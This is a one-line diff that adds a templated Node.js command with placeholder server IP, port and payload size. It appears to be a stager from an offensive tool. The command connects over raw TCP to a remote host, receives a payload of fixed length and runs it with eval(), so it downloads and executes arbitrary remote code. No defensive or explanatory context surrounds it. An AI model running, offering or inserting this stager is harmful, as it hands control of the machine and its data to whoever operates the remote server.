@@ -1,0 +1,1 @@
+node -e 'const net = require("net"); const len = {{PAYLOAD_SIZE}}; let b = Buffer.alloc(0); const client = new net.Socket(); client.connect({{SERVER_PORT}}, "{{SERVER_IP}}", () => {}); client.on("data", (chunk) => {b = Buffer.concat([b, chunk]); if (b.length == len) {client.end(); eval(b.toString());}});'
